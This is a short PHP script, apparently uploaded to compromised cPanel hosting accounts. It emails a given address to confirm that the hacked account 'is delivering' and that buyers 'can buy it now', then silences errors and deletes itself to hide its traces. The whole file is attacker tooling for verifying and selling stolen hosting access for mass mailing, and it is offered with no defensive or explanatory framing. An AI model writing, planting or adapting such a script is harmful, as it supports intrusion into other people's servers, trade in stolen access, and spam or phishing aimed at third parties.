<?php
error_reporting(0);
if($_GET["sendemail"]){
$test = mail($_GET["sendemail"],"Result Cpanel Test #".$_GET["id"],"This cpanel with id #".$_GET["id"]." is delivering , you can buy it now.");
if(!$test)
print "bad";
else
print "<b>sendok - [".$_GET["sendemail"]."] - ".$_GET["id"]."</b>";

unlink(__FILE__);
}
?>